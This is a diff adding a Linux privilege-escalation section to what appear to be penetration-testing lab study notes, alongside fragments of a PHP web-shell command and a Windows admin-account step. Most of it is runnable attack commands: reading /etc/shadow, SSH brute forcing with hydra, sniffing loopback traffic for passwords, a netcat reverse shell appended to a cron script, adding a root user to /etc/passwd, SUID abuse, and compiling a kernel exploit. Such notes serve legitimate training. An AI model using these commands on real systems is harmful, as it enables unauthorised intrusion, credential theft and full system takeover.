@@ -972,6 +972,80 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
   - `.\SigmaPotato "net user dave4 lab /add"`
   - `.\SigmaPotato "net localgroup Administrators dave4 /add"`  
 
+# Linux priviledge  
+- Enumeration
+  - Manual  
+    User/Groups: `id` `whoami` `cat /etc/passwd` `cat /etc/shadow` `groups` `ps aux`  
+    **Priviledge: `sudo -l`  `find / -perm -4000 -type f 2>/dev/null`  `find / -perm -2000 -type f 2>/dev/nul`**  
+    System and apps: `cat /etc/*release` `uname -a` `dpkg -l`  
+    List cron jobs: `ls -lah /etc/cron*`   
+    List writable directories: `find / -writable -type d 2>/dev/null` `find / -writable -type f 2>/dev/null`    
+    setuid, segid: `find / -perm -u=s -type f 2>/dev/null`    
+  - **Automation - unix-privesc-check**  
+    `scp /home/kali/offsec/unix-privesc-check-1.4/unix-privesc-check joe@192.168.185.214:/home/joe`  
+    `joe@debian-privesc:~$ ./unix-privesc-check standard > output.txt`  
+- Exposed Credential Info  
+  - Env variables  
+    `joe@debian-privesc:~$ env`
+  - bashrc  
+    `joe@debian-privesc:~$ cat .bashrc`
+  - **elevate to root `su -i`**  
+  - Attempt brute force attack of ssh by using a custom wordlist (min6, max6, follow by 3 numeric digits. E.g Lab000)   
+    `kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist`  
+    `hydra -l <user> -P wordlist  <target> -t 4 ssh -V`
+  - Monitor service footprint for credentials  
+    `joe@debian-privesc:~$ watch -n 1 "ps -aux | grep pass"`  
+    `joe@debian-privesc:~$ sudo tcpdump -i lo -A | grep "pass"`  
+  - escalate privilege by stolen password `su - root`
+- Cron Jobs
+  - Inspect cron log file
+    `joe@debian-privesc:~$ grep "CRON" /var/log/syslog`
+  - Read the sh file content and file permission (rw)
+  - Modify the script as one-liber reverse shell 
+    ```
+    start netcat listener nc -lnvp 1234
+    
+    echo >> user_backups.sh
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1234 >/tmp/f" >> user_backups.sh
+    ```
+- Password Authentication
+  - edit /etc/passwd (add new superuser "root2")  
+    ```
+    joe@debian-privesc:~$ openssl passwd w00t  #Fdzt.eqJQ4s0g
+    joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+    joe@debian-privesc:~$ su root2
+    root@debian-privesc:/home/joe# id
+    ```
+- Setuid
+  - **Enumerate SUID**  
+    `find / -perm -4000 -type f 2>/dev/null`   
+  - Check Binary against [GTFOBins](https://gtfobins.github.io/)  
+  - Get a root shell by abusing SUID program  
+    `joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;`
+  - **Enumerate capabilities**  
+    - `joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null`  
+    - look for "cap_setuid+ep" effective and permitted. Crack it by GTFOBins  
+- **Sudo**
+  - Enumerate Sudo Privileges  
+    - `sudo -l` #Look for NOPASSWD  
+    - Look for full root shell: (ALL : ALL) ALL  
+    - check GTFOBins from the binary (vim, find, python3)  
+- Kernel vulnerabilities  
+  - Gather system info  
+    `cat /etc/issue` `uname -r`  
+  - Searchsploit  
+    `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"`  
+  - Copy the exploit and inspect the code  
+    `kali@kali:~$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .`  
+    `kali@kali:~$ head 45010.c -n 20`  
+    `kali@kali:~$ mv 45010.c cve-2017-16995.c`  #rename exploit  
+  - transfer the code to target  
+    `kali@kali:~$ scp cve-2017-16995.c joe@192.168.123.216:`  
+  - Compile the exploit on the target machine  
+    `joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995`  
+  - Obtain a root shell via kernel exploit    
+    `joe@ubuntu-privesc:~$ ./cve-2017-16995`  
+
 # Active directory  
 
 
